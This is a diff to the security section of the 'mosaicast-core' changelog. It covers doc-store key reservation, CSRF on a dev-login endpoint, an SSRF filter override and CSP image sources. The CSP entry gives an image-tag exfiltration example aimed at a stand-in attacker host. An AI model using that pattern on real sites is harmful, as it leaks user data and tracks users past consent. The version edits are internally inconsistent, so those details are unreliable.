@@ -14,7 +14,7 @@ All notable changes to **mosaicast-core** are documented here. The format follow
 
 ### Security
 
-- **A plugin's backend can reserve the keys it authors (`0.6.0`, §7.2/§7.6).** Authorization on the doc store
+- **A plugin's backend can reserve the keys it authors (`0.6.1`, §7.2/§7.6).** Authorization on the doc store
   is per *plugin*, not per *document*. The floors say who may write; nothing said which key, so every caller
   above `writableBy` could overwrite or delete any shared-scope key — a value the plugin's own backend
   computed included, because the host cannot tell a scheduled write from a `curl`. A security audit
@@ -43,17 +43,17 @@ All notable changes to **mosaicast-core** are documented here. The format follow
   - **Still open:** everything else in a shared scope has no owner, so one podcaster can overwrite another's
     plugin data. Binding a shared document to its author needs an ownership concept the domain model does not
     have; until then, reserve the key or keep the data in `USER` scope.
-- **`POST /api/auth/dev-login` is CSRF-protected like every other mutation (`0.6.0`).** It was exempt under
+- **`POST /api/auth/dev-login` is CSRF-protected like every other mutation (`0.6.1`).** It was exempt under
   the `dev` profile, on the reasoning that the endpoint only exists there — but a dev instance is where a
   session is worth the most, since dev-login mints an ADMIN one on request with no password to phish. A
   cross-site page could drop a developer's own browser into a Dev ADMIN session. The SPA already sent the
   header on every unsafe method, so the exemption bought nothing.
-- **`mosaicast.feed.allow-private-targets` needs a second key (`0.6.0`).** It disables the SSRF egress filter
+- **`mosaicast.feed.allow-private-targets` needs a second key (`0.6.1`).** It disables the SSRF egress filter
   entirely and did so with a WARN nobody reads. With it on and
   `mosaicast.feed.allow-private-targets-confirmed` off, **the app refuses to start**. One variable is too
   easy to set while chasing something else and leave behind, and the failure is silent — everything keeps
   working, and the only difference is that the filter is gone.
-- **CSP image and media sources can be narrowed (`0.6.0`, §12.5).** `img-src 'self' data: https:` allows an
+- **CSP image and media sources can be narrowed (`0.6.1`, §12.5).** `img-src 'self' data: https:` allows an
   image from any host, so `<img src="https://attacker/p.gif?d=…">` is a working one-way exfiltration and
   tracking channel — past `connect-src 'self'` and past consent, which gates script/frame/connect and never
   touched this. `mosaicast.security.strict-media-sources` replaces the blanket with the origins the site's
@@ -78,7 +78,7 @@ All notable changes to **mosaicast-core** are documented here. The format follow
     `DocStore` methods throw `UnsupportedOperationException` — reads included, since resolving "me" without a
     caller means picking someone. Aggregates go through the new backend-only `queryAcrossUsers`, which names
     each owner and has no HTTP surface.
-  - **Requires SDK 0.6.0** (`platformApi` 0.6.x). Existing per-user data stays in whatever keys hold it —
+  - **Requires SDK 0.5.0** (`platformApi` 0.5.x). Existing per-user data stays in whatever keys hold it —
     the host cannot know a plugin's key convention — so plugins migrate it themselves.
 - **A plugin's data surface declares its own access floors (`0.6.0`, §7.2).** They were derived from slot
   `visibleTo`, taking the *minimum* across all slots as the read floor, so a plugin with one anonymous display
